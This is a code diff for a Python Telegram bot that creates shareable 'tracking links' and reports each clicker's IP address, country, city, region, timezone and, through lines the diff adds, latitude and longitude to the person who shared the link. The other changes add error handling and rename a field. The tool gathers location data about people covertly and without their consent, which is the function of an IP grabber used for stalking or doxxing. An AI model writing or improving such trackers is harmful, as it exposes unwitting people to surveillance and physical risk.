@@ -23,23 +23,27 @@ async def start(update: Update, context: CallbackContext) -> None:
 
 async def generate_link(update: Update, context: CallbackContext) -> None:
     """Generate a tracking link."""
-    # Generate a unique identifier for this tracking link
-    tracking_id = str(abs(hash(str(update.effective_user.id) + str(update.message.message_id))))
-    
-    # Create the tracking link
-    tracking_link = f"{BASE_URL}/track/{tracking_id}"
-    
-    # Create inline keyboard with the link
-    keyboard = [[InlineKeyboardButton("Share Link", url=tracking_link)]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    await update.message.reply_text(
-        "✅ Here's your tracking link:\n\n"
-        f"`{tracking_link}`\n\n"
-        "When someone clicks this link, I'll send you their information.",
-        reply_markup=reply_markup,
-        parse_mode='Markdown'
-    )
+    try:
+        # Generate a unique identifier for this tracking link
+        tracking_id = str(abs(hash(str(update.effective_user.id) + str(update.message.message_id))))
+        
+        # Create the tracking link
+        tracking_link = f"{BASE_URL}/track/{tracking_id}"
+        
+        # Create inline keyboard with the link
+        keyboard = [[InlineKeyboardButton("Share Link", url=tracking_link)]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(
+            "✅ Here's your tracking link:\n\n"
+            f"`{tracking_link}`\n\n"
+            "When someone clicks this link, I'll send you their information.",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        print(f"Error generating link: {e}")
+        await update.message.reply_text("❌ Error generating link. Please try again.")
 
 async def handle_tracking_data(tracking_id: str, ip_data: dict, bot) -> None:
     """Handle the tracking data received from the API."""
@@ -57,11 +61,13 @@ async def handle_tracking_data(tracking_id: str, ip_data: dict, bot) -> None:
         # Format the received data
         info = (
             "🎯 New click detected!\n\n"
-            f"📍 IP Address: `{ip_data.get('ip', 'Unknown')}`\n"
+            f"📍 IP Address: `{ip_data.get('ipAddress', 'Unknown')}`\n"
             f"🌍 Country: {ip_data.get('countryName', 'Unknown')}\n"
             f"🏢 City: {ip_data.get('cityName', 'Unknown')}\n"
             f"🌐 Region: {ip_data.get('regionName', 'Unknown')}\n"
             f"🕒 Timezone: {ip_data.get('timeZone', 'Unknown')}\n"
+            f"📍 Latitude: {ip_data.get('latitude', 'Unknown')}\n"
+            f"📍 Longitude: {ip_data.get('longitude', 'Unknown')}\n"
         )
         
         # Send the information to admin
@@ -88,15 +94,20 @@ async def help_command(update: Update, context: CallbackContext) -> None:
 
 def main() -> None:
     """Start the bot."""
-    application = Application.builder().token(BOT_TOKEN).build()
+    try:
+        # Create the Application
+        application = Application.builder().token(BOT_TOKEN).build()
 
-    # Add handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("generate", generate_link))
+        # Add handlers
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CommandHandler("help", help_command))
+        application.add_handler(CommandHandler("generate", generate_link))
 
-    # Start the bot
-    application.run_polling()
+        # Start the bot
+        print("Starting bot...")
+        application.run_polling()
+    except Exception as e:
+        print(f"Error starting bot: {e}")
 
 if __name__ == '__main__':
     main() 
